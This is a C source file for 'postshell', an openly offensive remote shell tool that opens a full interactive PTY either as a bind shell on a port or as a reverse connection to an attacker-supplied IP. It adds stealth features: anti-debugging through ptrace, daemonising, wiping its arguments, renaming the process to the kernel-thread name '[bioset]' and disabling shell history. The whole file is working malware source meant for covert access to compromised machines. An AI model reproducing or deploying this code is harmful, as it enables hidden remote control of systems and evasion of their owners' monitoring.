#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <pty.h>
#include <sys/ptrace.h>
#include <stdbool.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define SHELL "/bin/bash"
#define FAKE_NAME "[bioset]"

//#define _DEBUG // uncomment for debugging mode

//http://patorjk.com/software/taag/#p=display&f=AMC%20AAA01&t=postshell
char *banner = R"EOF( .S_sSSs      sSSs_sSSs      sSSs  sdSS_SSSSSSbs    sSSs   .S    S.     sSSs  S.      S.      
.SS~YS%%b    d%%SP~YS%%b    d%%SP  YSSS~S%SSSSSP   d%%SP  .SS    SS.   d%%SP  SS.     SS.     
S%S   `S%b  d%S'     `S%b  d%S'         S%S       d%S'    S%S    S%S  d%S'    S%S     S%S     
S%S    S%S  S%S       S%S  S%|          S%S       S%|     S%S    S%S  S%S     S%S     S%S     
S%S    d*S  S&S       S&S  S&S          S&S       S&S     S%S SSSS%S  S&S     S&S     S&S     
S&S   .S*S  S&S       S&S  Y&Ss         S&S       Y&Ss    S&S  SSS&S  S&S_Ss  S&S     S&S     
S&S_sdSSS   S&S       S&S  `S&&S        S&S       `S&&S   S&S    S&S  S&S~SP  S&S     S&S     
S&S~YSSY    S&S       S&S    `S*S       S&S         `S*S  S&S    S&S  S&S     S&S     S&S     
S*S         S*b       d*S     l*S       S*S          l*S  S*S    S*S  S*b     S*b     S*b     
S*S         S*S.     .S*S    .S*P       S*S         .S*P  S*S    S*S  S*S.    S*S.    S*S.    
S*S          SSSbs_sdSSS   sSS*S        S*S       sSS*S   S*S    S*S   SSSbs   SSSbs   SSSbs  
S*S           YSSP~YSSY    YSS'         S*S       YSS'    SSS    S*S    YSSP    YSSP    YSSP  
SP                                      SP                       SP                           
Y                                       Y                        Y                            
https://github.com/rek7/postshell                      
)EOF";


int create_conn(char* ip, int port)
{
    int s0 = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_info = { 0 };
    serv_info.sin_family = AF_INET;
    serv_info.sin_port = htons(port);
    //serv_info.sin_addr.s_addr = inet_addr(ip);
    serv_info.sin_addr.s_addr = inet_addr(ip);
    //serv_info.sin_addr.s_addr = resolve_ip(ip);

    return (connect(s0, (struct sockaddr*)&serv_info, sizeof(serv_info)) == 0 ? s0 : -1);
}

int return_conn(int port) // bind to a port for bindshell
{
    int s0 = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_info = { 0 };
    setsockopt(s0, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)); // allow reuse of port incase of program crash
    serv_info.sin_family = AF_INET;
    serv_info.sin_port = htons(port);
    serv_info.sin_addr.s_addr = INADDR_ANY;
    if (bind(s0, (struct sockaddr*)&serv_info, sizeof(serv_info)) == 0) {
        listen(s0, 0); // only accept 1 client connection and tell everyone else to fuck off
        int s1 = accept(s0, (struct sockaddr*)NULL, NULL);
        close(s0);
        return s1;
    }
    else {
        #ifdef _DEBUG
            perror("bind");
        #endif
        return -1;
    }
}

bool is_alive(int s1)
{
    return (send(s1, "\0", 1, 0) == 1 ? true : false);
}

bool open_pty(int* master, int* slave)
{
    return ((openpty(master, slave, NULL, NULL, NULL) == 0) ? true : false);
}

bool cleanup_tty(int socket, int master)
{
    write(master, "exit\r\n", 5);
    close(master);
    close(socket);
    return true;
}

bool open_term(int s0)
{
    fd_set comm;
    int master, slave, pid; // master == pty, tty == slave

    if (open_pty(&master, &slave) && ttyname(slave) != NULL) {
        struct winsize ws = {0};
        #ifdef _DEBUG
        printf("Opened PTY with master/slave, current tty name: %s\n", ttyname(slave));
        #endif

        /*
        env variables
        */
        putenv("HISTFILE=/dev/null");
        putenv("PATH:/usr/local/sbin:/usr/sbin:/sbin:/bin:/usr/local/bin:/usr/bin");
        putenv("TERM=linux");
        putenv("PS1=\\x1b[1;36m\\u@\\h:\\w\\$\\x1b[0m");
        putenv(("SHELL=%s", SHELL));

        ws.ws_row = 150;
        ws.ws_col = 150;

        if (ioctl(master, TIOCSWINSZ, &ws) != 0) { // send the config to the device XD
            #ifdef _DEBUG
            perror("iotcl");
            #endif
            return false;
        }

        pid = fork();
        if (pid < 0) {
            #ifdef _DEBUG
            perror("fork");
            #endif
            return false;
        }

        if (pid == 0) { // slave
            close(master);
            close(s0);
            ioctl(slave, TIOCSCTTY, NULL);
            if (setsid() < 0) {
                #ifdef _DEBUG
                perror("setsid");
                return false;
                #endif
            }

            dup2(slave, 0);
            dup2(slave, 1);
            dup2(slave, 2);

            if (slave > 2) {
                close(slave);
            }
            execl(SHELL, "-i", NULL);
            return true;
        }
        else { // master
            close(slave);
            write(master, "stty -echo\r\n", 11); // removes duplicate commands being shown to the user
            send(s0, banner, strlen(banner), 0);
            usleep(1250000);
            tcflush(master, TCIOFLUSH);
            write(master, "\r\n", 1);
            while (1) {
                FD_ZERO(&comm);
                FD_SET(s0, &comm);
                FD_SET(master, &comm);
                char message[1024] = { 0 };

                if (!is_alive(s0)) { // detecting an invalid connection
                    break;
                }

                int check_fd = (master > s0) ? master : s0;

                if (select(check_fd + 1, &comm, NULL, NULL, NULL) < 0) {
                    #ifdef _DEBUG
                        perror("select");
                    #endif
                    break;
                }

                if (FD_ISSET(s0, &comm)) { // write command
                    recv(s0, message, sizeof(message), 0);
                    write(master, message, strlen(message));
                    if (strcmp(message, "^C\r\n") == 0) //https://stackoverflow.com/questions/2195885/how-to-send-ctrl-c-control-character-or-terminal-hangup-message-to-child-process
                    {
                        char ctrl_c = 0x003;
                        write(master, &ctrl_c, 1); // kill dat hoe
                    }
                    else if (strcmp(message, "exit\r\n") == 0) {
                        char* bye_msg = "Exiting.\r\n";
                        send(s0, bye_msg, strlen(bye_msg), 0);
                        cleanup_tty(s0, master);
                        return true;
                    }
                }

                if (FD_ISSET(master, &comm)) {
                    read(master, message, sizeof(message));
                    send(s0, message, strlen(message), 0);
                }
            }
        }
    }
    return cleanup_tty(s0, master);
}

bool detect_debugging() {
    if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0){ // anti-debugging
        return true; 
    }
    return false;
}

void cloak_name(int argc, char *argv[]) {
    for(int i=0;i<argc;i++){
      memset(argv[i],'\x0',strlen(argv[i])); // we need to remove the sys args
    }
    strcpy(argv[0], FAKE_NAME); // cloak, command name
    prctl(PR_SET_NAME, FAKE_NAME); // cloak, thread name
}

void handle_sigs(void) {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN); // fuck zombie process's
}

int main(int argc, char *argv[])
{
    if(!detect_debugging()) {
        if (argc != 2 && argc != 3) {
            printf("Bind Shell Usage: %s port\n", argv[0]);
            printf("Back Connect Usage: %s ip port\n", argv[0]);
        }
        else {
            handle_sigs();
            if(!daemon(1, 0)) {
                int s1 = 0;
                if (argc == 2) // bindshell -- ./binary port
                {
                    s1 = return_conn(atoi(argv[1]));
                }
                else if (argc == 3) // backconnect -- ./binary ip port
                {
                    s1 = create_conn(argv[1], atoi(argv[2]));
                }
                cloak_name(argc, argv);
                if (s1 > 0 && open_term(s1)) {
                    #ifdef _DEBUG
                    printf("Safely closed connection and terminal.\n");
                    #endif
                    return EXIT_SUCCESS;
                }
            } else {
                #ifdef _DEBUG
                    perror("daemon");
                #endif
            }
        }
    }
    return EXIT_FAILURE;
}